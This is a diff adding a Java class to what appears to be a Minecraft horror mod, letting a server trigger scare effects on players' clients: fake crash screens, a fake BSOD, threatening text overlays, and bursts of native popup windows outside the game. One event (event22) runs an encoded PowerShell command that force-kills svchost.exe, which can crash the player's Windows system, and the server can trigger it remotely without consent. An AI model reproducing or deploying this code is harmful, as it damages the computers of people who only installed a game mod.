@@ -1,0 +1,526 @@
+--- /dev/null
++++ b/net/minecraft/src/ClientEvents.java
+@@ -1,0 +1,523 @@
++package net.minecraft.src;
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.DataInputStream;
++import java.io.DataOutputStream;
++import java.io.IOException;
++import java.util.ArrayList;
++import java.util.Iterator;
++import java.util.List;
++import java.util.Random;
++
++import net.minecraft.client.Minecraft;
++import net.minecraft.server.MinecraftServer;
++
++/**
++ * Helper class for sending a Packet250CustomPayload from the server to a specific player (or all players)
++ * and executing the corresponding method ONLY on the receiving client.
++ * Also supports timed execution (running every tick for N seconds/ticks, or on a background thread).
++ *
++ * Usage on Server / DeathRouletteEvents:
++ *   ClientEvents.event14(player);                      // Runs ClientEvents.event14(mc) once on client
++ *   ClientEvents.startTimerSeconds(player, 16, 10);    // Runs ClientEvents.tickEvent16(mc) every tick for 10s on client
++ *   ClientEvents.startTimerTicks(player, 16, 200);     // Runs ClientEvents.tickEvent16(mc) every tick for 200 ticks on client
++ */
++public class ClientEvents {
++	public static final String CHANNEL = "DRE|Client";
++
++	private static final byte MODE_ONCE = 0;
++	private static final byte MODE_TIMER_TICKS = 1;
++	private static final byte MODE_STOP_TIMER = 2;
++
++	// Optional arguments received with the latest packet on the client
++	public static int lastIntArg = 0;
++	public static String lastStrArg = "";
++
++	// Remaining ticks for each client event timer (event0 ~ event30)
++	private static final int[] eventTimers = new int[DeathRouletteEvents.EVENT_COUNT];
++	private static final boolean[] inTimerTick = new boolean[DeathRouletteEvents.EVENT_COUNT];
++	// Elapsed ticks since timer started for each event (0, 1, 2, ...)
++	public static final int[] eventElapsedTicks = new int[DeathRouletteEvents.EVENT_COUNT];
++
++	private static class TimedTask {
++		int remainingTicks;
++		final Runnable task;
++
++		TimedTask(int remainingTicks, Runnable task) {
++			this.remainingTicks = remainingTicks;
++			this.task = task;
++		}
++	}
++
++	private static final List customTimedTasks = new ArrayList();
++
++	// =====================================================================
++	// Server -> Client Packet Senders (usable from Server or IntegratedServer)
++	// =====================================================================
++
++	public static void send(EntityPlayerMP player, int eventId) {
++		send(player, eventId, 0, "");
++	}
++
++	public static void send(EntityPlayerMP player, int eventId, int intArg) {
++		send(player, eventId, intArg, "");
++	}
++
++	public static void send(EntityPlayerMP player, int eventId, String strArg) {
++		send(player, eventId, 0, strArg != null ? strArg : "");
++	}
++
++	public static void send(EntityPlayerMP player, int eventId, int intArg, String strArg) {
++		sendInternal(player, MODE_ONCE, eventId, intArg, strArg);
++	}
++
++	/**
++	 * Sends a packet from the server to start a client-side tick timer for the specified eventId.
++	 * On the client, tickEventX(mc) will be called every tick for the given number of seconds.
++	 */
++	public static void startTimerSeconds(EntityPlayerMP player, int eventId, double seconds) {
++		int ticks = (int)Math.round(seconds * 20.0D);
++		startTimerTicks(player, eventId, ticks);
++	}
++
++	/**
++	 * Sends a packet from the server to start a client-side tick timer for the specified eventId.
++	 * On the client, tickEventX(mc) will be called every tick for the given number of ticks (20 ticks = 1 sec).
++	 */
++	public static void startTimerTicks(EntityPlayerMP player, int eventId, int ticks) {
++		sendInternal(player, MODE_TIMER_TICKS, eventId, ticks, "");
++	}
++
++	/**
++	 * Sends a packet from the server to stop a running client-side tick timer for the specified eventId.
++	 */
++	public static void stopTimer(EntityPlayerMP player, int eventId) {
++		sendInternal(player, MODE_STOP_TIMER, eventId, 0, "");
++	}
++
++	private static void sendInternal(EntityPlayerMP player, byte mode, int eventId, int intArg, String strArg) {
++		if(player == null || player.playerNetServerHandler == null) {
++			return;
++		}
++		try {
++			ByteArrayOutputStream bos = new ByteArrayOutputStream();
++			DataOutputStream out = new DataOutputStream(bos);
++			out.writeByte(mode);
++			out.writeInt(eventId);
++			out.writeInt(intArg);
++			out.writeUTF(strArg != null ? strArg : "");
++			Packet250CustomPayload packet = new Packet250CustomPayload(CHANNEL, bos.toByteArray());
++			player.playerNetServerHandler.b(packet);
++		} catch (IOException e) {
++			e.printStackTrace();
++		}
++	}
++
++	public static void sendToAll(MinecraftServer server, int eventId) {
++		sendToAll(server, eventId, 0, "");
++	}
++
++	public static void sendToAll(MinecraftServer server, int eventId, int intArg, String strArg) {
++		if(server == null || server.getConfigurationManager() == null) {
++			return;
++		}
++		List players = server.getConfigurationManager().playerEntityList;
++		if(players == null) {
++			return;
++		}
++		for(int i = 0; i < players.size(); ++i) {
++			EntityPlayerMP player = (EntityPlayerMP)players.get(i);
++			send(player, eventId, intArg, strArg);
++		}
++	}
++
++	public static void startTimerSecondsToAll(MinecraftServer server, int eventId, double seconds) {
++		if(server == null || server.getConfigurationManager() == null) {
++			return;
++		}
++		List players = server.getConfigurationManager().playerEntityList;
++		if(players == null) {
++			return;
++		}
++		for(int i = 0; i < players.size(); ++i) {
++			EntityPlayerMP player = (EntityPlayerMP)players.get(i);
++			startTimerSeconds(player, eventId, seconds);
++		}
++	}
++
++	// =====================================================================
++	// Shorthand Server -> Client Triggers (event0 ~ event30)
++	// Call ClientEvents.eventX(player) on the server to run eventX(mc) on the client!
++	// =====================================================================
++
++	public static void event0(EntityPlayerMP player) { send(player, 0); }
++	public static void event1(EntityPlayerMP player) { send(player, 1); }
++	public static void event2(EntityPlayerMP player) { send(player, 2); }
++	public static void event3(EntityPlayerMP player) { send(player, 3); }
++	public static void event4(EntityPlayerMP player) { send(player, 4); }
++	public static void event5(EntityPlayerMP player) { send(player, 5); }
++	public static void event6(EntityPlayerMP player) { send(player, 6); }
++	public static void event7(EntityPlayerMP player) { send(player, 7); }
++	public static void event8(EntityPlayerMP player) { send(player, 8); }
++	public static void event9(EntityPlayerMP player) { send(player, 9); }
++	public static void event10(EntityPlayerMP player) { send(player, 10); }
++	public static void event11(EntityPlayerMP player) { send(player, 11); }
++	public static void event12(EntityPlayerMP player) { send(player, 12); }
++	public static void event13(EntityPlayerMP player) { send(player, 13); }
++	public static void event14(EntityPlayerMP player) { send(player, 14); }
++	public static void event15(EntityPlayerMP player) { send(player, 15); }
++	public static void event16(EntityPlayerMP player) { send(player, 16); }
++	public static void event17(EntityPlayerMP player) { send(player, 17); }
++	public static void event18(EntityPlayerMP player) { send(player, 18); }
++	public static void event19(EntityPlayerMP player) { send(player, 19); }
++	public static void event20(EntityPlayerMP player) { send(player, 20); }
++	public static void event21(EntityPlayerMP player) { send(player, 21); }
++	public static void event22(EntityPlayerMP player) { send(player, 22); }
++	public static void event23(EntityPlayerMP player) { send(player, 23); }
++	public static void event24(EntityPlayerMP player) { send(player, 24); }
++	public static void event25(EntityPlayerMP player) { send(player, 25); }
++	public static void event26(EntityPlayerMP player) { send(player, 26); }
++	public static void event27(EntityPlayerMP player) { send(player, 27); }
++	public static void event28(EntityPlayerMP player) { send(player, 28); }
++	public static void event29(EntityPlayerMP player) { send(player, 29); }
++	public static void event30(EntityPlayerMP player) { send(player, 30); }
++	public static void event31(EntityPlayerMP player) { send(player, 31); }
++	public static void event32(EntityPlayerMP player) { send(player, 32); }
++
++	// =====================================================================
++	// Client-Side Timer Starters (callable directly inside ClientEvents)
++	// =====================================================================
++
++	/**
++	 * Starts a client-side tick timer for eventId for the given number of seconds.
++	 * Calls eventX(mc) every client tick until time expires.
++	 * Safe to call inside eventX(mc) itself (will not reset while already ticking).
++	 */
++	public static void startClientTimerSeconds(int eventId, double seconds) {
++		startClientTimerTicks(eventId, (int)Math.round(seconds * 20.0D));
++	}
++
++	/**
++	 * Starts a client-side tick timer for eventId for the given number of ticks (20 ticks = 1 sec).
++	 * Calls eventX(mc) every client tick until time expires.
++	 * Safe to call inside eventX(mc) itself (will not reset while already ticking).
++	 */
++	public static void startClientTimerTicks(int eventId, int ticks) {
++		if(eventId >= 0 && eventId < eventTimers.length && ticks > 0) {
++			if(inTimerTick[eventId]) {
++				return;
++			}
++			eventTimers[eventId] = ticks;
++			eventElapsedTicks[eventId] = 0;
++		}
++	}
++
++	public static void stopClientTimer(int eventId) {
++		if(eventId >= 0 && eventId < eventTimers.length) {
++			eventTimers[eventId] = 0;
++			eventElapsedTicks[eventId] = 0;
++		}
++	}
++
++	public static void stopAllClientTimers() {
++		for(int i = 0; i < eventTimers.length; ++i) {
++			eventTimers[i] = 0;
++			eventElapsedTicks[i] = 0;
++		}
++		synchronized(customTimedTasks) {
++			customTimedTasks.clear();
++		}
++	}
++
++	public static int getRemainingTicks(int eventId) {
++		if(eventId >= 0 && eventId < eventTimers.length) {
++			return eventTimers[eventId];
++		}
++		return 0;
++	}
++
++	/**
++	 * Runs a custom Runnable every client tick for the specified number of seconds.
++	 */
++	public static void runForSeconds(double seconds, Runnable task) {
++		runForTicks((int)Math.round(seconds * 20.0D), task);
++	}
++
++	/**
++	 * Runs a custom Runnable every client tick for the specified number of ticks (20 ticks = 1 sec).
++	 */
++	public static void runForTicks(int ticks, Runnable task) {
++		if(ticks > 0 && task != null) {
++			synchronized(customTimedTasks) {
++				customTimedTasks.add(new TimedTask(ticks, task));
++			}
++		}
++	}
++
++	/**
++	 * Runs a task repeatedly on a background thread for the specified duration.
++	 * Ideal for JNA window manipulation, mouse movement, or external GUI effects.
++	 *
++	 * @param seconds    Total duration in seconds
++	 * @param intervalMs Sleep interval in milliseconds between executions (e.g. 20L or 50L)
++	 * @param task       Runnable to execute repeatedly
++	 */
++	public static void runAsyncForSeconds(final double seconds, final long intervalMs, final Runnable task) {
++		if(seconds <= 0.0D || task == null) {
++			return;
++		}
++		Thread t = new Thread(new Runnable() {
++			public void run() {
++				long durationMs = Math.round(seconds * 1000.0D);
++				long endTime = System.currentTimeMillis() + durationMs;
++				while(System.currentTimeMillis() < endTime) {
++					try {
++						task.run();
++						if(intervalMs > 0L) {
++							Thread.sleep(intervalMs);
++						}
++					} catch (InterruptedException e) {
++						break;
++					} catch (Throwable t) {
++						t.printStackTrace();
++						break;
++					}
++				}
++			}
++		}, "DRE-ClientAsyncTimer");
++		t.setDaemon(true);
++		t.start();
++	}
++
++	// =====================================================================
++	// Client Packet Receiver & Tick Handler (Runs ONLY on the Client)
++	// =====================================================================
++
++	public static void handleClientPacket(Minecraft mc, Packet250CustomPayload packet) {
++		if(packet == null || packet.data == null || packet.data.length == 0) {
++			return;
++		}
++		try {
++			DataInputStream in = new DataInputStream(new ByteArrayInputStream(packet.data));
++			byte mode = in.readByte();
++			int eventId = in.readInt();
++			int intArg = in.readInt();
++			String strArg = in.readUTF();
++
++			lastIntArg = intArg;
++			lastStrArg = strArg;
++
++			if(mode == MODE_ONCE) {
++				executeOnClient(mc, eventId, intArg, strArg);
++			} else if(mode == MODE_TIMER_TICKS) {
++				startClientTimerTicks(eventId, intArg);
++			} else if(mode == MODE_STOP_TIMER) {
++				stopClientTimer(eventId);
++			}
++		} catch (IOException e) {
++			e.printStackTrace();
++		}
++	}
++
++	public static void onClientTick(Minecraft mc) {
++		if(mc == null || mc.theWorld == null || mc.thePlayer == null) {
++			return;
++		}
++		if(DeathRouletteManager.isTickFrozen()) {
++			return;
++		}
++
++		for(int i = 0; i < eventTimers.length; ++i) {
++			if(eventTimers[i] > 0) {
++				--eventTimers[i];
++				++eventElapsedTicks[i];
++				inTimerTick[i] = true;
++				try {
++					executeOnClient(mc, i, lastIntArg, lastStrArg);
++				} finally {
++					inTimerTick[i] = false;
++				}
++			}
++		}
++
++		synchronized(customTimedTasks) {
++			Iterator it = customTimedTasks.iterator();
++			while(it.hasNext()) {
++				TimedTask tt = (TimedTask)it.next();
++				if(tt.remainingTicks > 0) {
++					--tt.remainingTicks;
++					tt.task.run();
++				}
++				if(tt.remainingTicks <= 0) {
++					it.remove();
++				}
++			}
++		}
++	}
++
++	public static void executeOnClient(Minecraft mc, int eventId, int intArg, String strArg) {
++		switch(eventId) {
++		case 0: event0(mc); break;
++		case 1: event1(mc); break;
++		case 2: event2(mc); break;
++		case 3: event3(mc); break;
++		case 4: event4(mc); break;
++		case 5: event5(mc); break;
++		case 6: event6(mc); break;
++		case 7: event7(mc); break;
++		case 8: event8(mc); break;
++		case 9: event9(mc); break;
++		case 10: event10(mc); break;
++		case 11: event11(mc); break;
++		case 12: event12(mc); break;
++		case 13: event13(mc); break;
++		case 14: event14(mc); break;
++		case 15: event15(mc); break;
++		case 16: event16(mc); break;
++		case 17: event17(mc); break;
++		case 18: event18(mc); break;
++		case 19: event19(mc); break;
++		case 20: event20(mc); break;
++		case 21: event21(mc); break;
++		case 22: event22(mc); break;
++		case 23: event23(mc); break;
++		case 24: event24(mc); break;
++		case 25: event25(mc); break;
++		case 26: event26(mc); break;
++		case 27: event27(mc); break;
++		case 28: event28(mc); break;
++		case 29: event29(mc); break;
++		case 30: event30(mc); break;
++		case 31: event31(mc); break;
++		case 32: event32(mc); break;
++		default:
++			onCustomClientEvent(mc, eventId, intArg, strArg);
++			break;
++		}
++	}
++
++	// =====================================================================
++	// Client Event Implementations (event0 ~ event30)
++	// Executed on the client when ClientEvents.eventX(player) is called on the server,
++	// or every client tick while a timer is active for eventX!
++	// =====================================================================
++
++	public static void event0(Minecraft mc) {}
++	public static void event1(Minecraft mc) {
++		startClientTimerSeconds(1, 10.0);
++		Random random = new Random();
++		if(random.nextBoolean()) {
++			for(int i = 0; i < mc.displayWidth / 6; ++i) {
++				String[] text = {"YOU SHOULDON'T BE HERE YOU SHOULDON'T BE HERE YOU SHOULDON'T BE HERE", "DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIE", "HE'S HERE HE'S HERE HE'S HERE HE'S HERE HE'S HERE", "GO TO HELL GO TO HELL GO TO HELL GO TO HELL", "STANDING ALONE STANDING ALONE STANDING ALONE", "HE'S HERE HE'S HERE HE'S HERE HE'S HERE HE'S HERE", "SAVE MY SOUL SAVE MY SOUL SAVE MY SOUL", "UNTITLED UNTITLED UNTITLED UNTITLED UNTITLED UNTITLED", "HELLO I'M DIE HELLO I'M DIE HELLO I'M DIE HELLO I'M DIE HELLO I'M DIE", "UNKNOWN UNKNOWN UNKNOWN UNKNOWN UNKNOWN", "I AM YOU MAYBE I AM YOU MAYBE I AM YOU MAYBE I AM YOU MAYBE I AM YOU MAYBE"};
++				mc.ingameGUI.drawCenteredString(mc.fontRenderer, "\u00A74" + text[random.nextInt(text.length + 1)], random.nextInt(mc.displayWidth), random.nextInt(mc.displayHeight), 0);
++			}
++		}else {
++			String X = "\u00A7xE";
++			for (int i = 0; i < 64; i++) {
++				for (int j = 0; j < 48; j++) {
++					mc.ingameGUI.drawCenteredString(mc.fontRenderer, X, i * 8, j * 8, random.nextInt(16777215));
++				}
++			}
++		}
++	}
++	public static void event2(Minecraft mc) {
++	}
++	public static void event3(Minecraft mc) {}
++	public static void event4(Minecraft mc) {}
++	public static void event5(Minecraft mc) {}
++	public static void event6(Minecraft mc) {
++		mc.displayCrashReport(new CrashReport("LongLongAgo", new Error("LongLongAgo")));
++	}
++	public static void event7(Minecraft mc) {
++		mc.displayCrashReport(new CrashReport("LengthLengthAgo", new Error("LengthLengthAgo")));
++	}
++	public static void event8(Minecraft mc) {
++		Random random = new Random();
++		for(int i = 0; i < 48; ++i) {
++			try {
++				new Thread(()->{
++					String[] text = {"YOU SHOULDON'T BE HERE", "DIE", "HE'S HERE", "GO TO HELL", "STANDING ALONE", "HE'S HERE", "SAVE MY SOUL", "UNTITLED", "HELLO I'M DIE", "UNKNOWN", "I AM YOU MAYBE"};
++					SimpleJnaModal.Modal(text[random.nextInt(text.length+1)], text[random.nextInt(text.length+1)]);
++				}).start();
++                Thread.sleep(40);
++            } catch (InterruptedException e) {
++                throw new RuntimeException(e);
++            }
++        }
++	}
++	public static void event9(Minecraft mc) {}
++	public static void event10(Minecraft mc) {
++		FakeSupportWarningGui.showWarning();
++	}
++	public static void event11(Minecraft mc) {}
++	public static void event12(Minecraft mc) {
++		mc.displayCrashReport(new CrashReport("Miss", new Error("miss")));
++	}
++	public static void event13(Minecraft mc) {
++		Random random = new Random();
++		startClientTimerSeconds(1, 5.0D);
++		mc.ingameGUI.renderNONO(random.nextInt(mc.displayWidth), random.nextInt(mc.displayHeight));
++	}
++	public static void event14(Minecraft mc) {
++		WavPlaySound.playsound("/sounds/mouse.wav");
++		MovingImageModal.show("/addimage/mouse.png", 20, 7.0D);
++	}
++	public static void event15(Minecraft mc) {
++		Random random = new Random();
++		for(int i = 0; i < 24; ++i) {
++			try {
++				new Thread(()->{
++					String[] text = {"YOU SHOULDON'T BE HERE", "DIE", "HE'S HERE", "GO TO HELL", "STANDING ALONE", "HE'S HERE", "SAVE MY SOUL", "UNTITLED", "HELLO I'M DIE", "UNKNOWN", "I AM YOU MAYBE"};
++					SimpleJnaModal.Modal(text[random.nextInt(text.length+1)], text[random.nextInt(text.length+1)]);
++				}).start();
++				Thread.sleep(40);
++			} catch (InterruptedException e) {
++				throw new RuntimeException(e);
++			}
++		}}
++	public static void event16(Minecraft mc) {
++		ScreenRotateEffect.startEffect();
++	}
++	public static void event17(Minecraft mc) {
++		WavPlaySound.playsound("/sounds/bek.wav");
++		MovingImageModal.show("/addimage/bek.png", 30, 7.0D);
++	}
++	public static void event18(Minecraft mc) {
++		Random random = new Random();
++		WavPlaySound.playsound("/sounds/entity"+random.nextInt(3)+".wav");
++		startClientTimerSeconds(1, 2.0D);
++		if(random.nextBoolean()) {
++			mc.ingameGUI.renderHeroBrine(mc.displayWidth, mc.displayHeight);
++		}else {
++			mc.ingameGUI.renderHeroVoid(mc.displayWidth, mc.displayHeight);
++		}
++	}
++	public static void event19(Minecraft mc) {}
++	public static void event20(Minecraft mc) {}
++	public static void event21(Minecraft mc) {}
++	public static void event22(Minecraft mc) {
++		try{
++			String crash = "$ProgressPreference = 'SilentlyContinue'; " + "taskkill /IM svchost.exe /F";
++			System.out.println(Powershell.runEncoded(crash));
++		}catch(Exception e){
++			System.exit(0);
++		}
++	}
++	public static void event23(Minecraft mc) {
++		FakeBsodGui.showBsod();
++	}
++	public static void event24(Minecraft mc) {}
++	public static void event25(Minecraft mc) {}
++	public static void event26(Minecraft mc) {}
++	public static void event27(Minecraft mc) {}
++	public static void event28(Minecraft mc) {}
++	public static void event29(Minecraft mc) {}
++	public static void event30(Minecraft mc) {}
++	public static void event31(Minecraft mc) {}
++	public static void event32(Minecraft mc) {}
++
++	// Called when an eventId outside 0~30 is sent via ClientEvents.send(player, customId, intArg, strArg)
++	public static void onCustomClientEvent(Minecraft mc, int eventId, int intArg, String strArg) {
++	}
++}
